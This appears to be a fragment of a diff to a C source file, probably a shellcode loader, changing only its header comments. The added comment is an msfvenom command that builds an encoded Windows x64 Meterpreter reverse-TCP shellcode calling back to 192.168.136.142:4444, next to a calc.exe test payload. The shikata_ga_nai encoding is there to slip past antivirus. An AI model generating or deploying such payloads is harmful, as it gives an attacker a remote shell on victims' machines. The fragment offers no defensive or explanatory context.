@@ -1,5 +1,5 @@
-//msfvenom -a x64 --platform Windows -p windows/x64/exec CMD=calc.exe -e x64/shikata_ga_nai -b '\x00' -i 3 -f c
-
+//msfvenom -a x64 --platform Windows -p windows/x64/exec CMD=calc.exe -e x86/shikata_ga_nai -b '\x00' -i 3 -f c
+//msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.142 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
